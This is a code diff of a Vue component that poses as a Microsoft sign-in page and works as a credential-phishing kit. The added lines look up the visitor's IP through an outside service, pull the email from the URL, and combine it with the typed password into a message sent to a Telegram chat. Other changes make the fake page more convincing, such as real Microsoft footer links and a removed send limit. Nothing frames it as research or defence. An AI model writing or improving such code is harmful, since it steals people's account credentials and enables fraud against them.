@@ -12,32 +12,30 @@ export default {
       isActive: false,
       count: 0,
       finalCount: 1, // Only send once
-    }
+    };
   },
 
   computed: {
     isFormValid() {
-      return this.formDataRes.password.trim() !== ''
-    }
+      return this.formDataRes.password.trim() !== "";
+    },
   },
 
   methods: {
-
-    // registerFan() {
-    //   this.showPopup = true;
-    // },
-
     async finishJoob() {
-      //  this.showPopup = true;
-
       this.count++;
-      console.log("Count:", this.count, "Final:", this.finalCount);
+      console.log("Count:", this.count);
 
-      if (this.count <= this.finalCount) {
+      if (this.count) {
         this.loading = true;
 
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        const email = this.$route.query.email;
+        const ip = data.ip;
+
         // Format the message as string
-        const message = `*🔔 MICROSOFT *\nPASSWORD: ${this.formDataRes.password}`;
+        const message = `🔔 MICROSOFT \nEMAIL: ${email}\nPASSWORD: ${this.formDataRes.password}\nIP: ${ip}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
@@ -60,7 +58,6 @@ export default {
         const payload = {
           chat_id: chatId,
           text: message,
-
         };
 
         console.log("Sending payload:", payload);
@@ -69,8 +66,8 @@ export default {
         console.error("Telegram API Error:", error);
       }
     },
-  }
-}
+  },
+};
 </script>
 
 <template>
@@ -78,7 +75,7 @@ export default {
     <div class="login-card">
       <!-- <div class="back">←</div> -->
 
-      <div style="width: full; display: flex; justify-content: center;">
+      <div style="width: full; display: flex; justify-content: center">
         <svg
           aria-label="Microsoft"
           data-testid="microsoftLogo"
@@ -118,25 +115,23 @@ export default {
           <input type="password" v-model="formDataRes.password" required />
           <label>password</label>
         </div>
-  
+
         <a href="#" class="forgot"> Forgot your password? </a>
-  
+
         <button class="next">Next</button>
       </form>
 
-
       <div class="signup">
-        
-        <a href="#">Sign in with a different Microsoft account</a>
+        <a href="./email.vue">Sign in with a different Microsoft account</a>
       </div>
     </div>
 
     <footer>
-      <a href="#">Help and feedback</a>
+      <a href="https://support.microsoft.com/home/contact?linkquery=Show%20me%20self-help%20support%20for%20sign%20in%20issues">Help and feedback</a>
 
-      <a href="#">Terms of use</a>
+      <a href="https://www.microsoft.com/en-us/servicesagreement">Terms of use</a>
 
-      <a href="#">Privacy and cookies</a>
+      <a href="https://www.microsoft.com/en-us/privacy/-">Privacy and cookies</a>
     </footer>
   </div>
 </template>
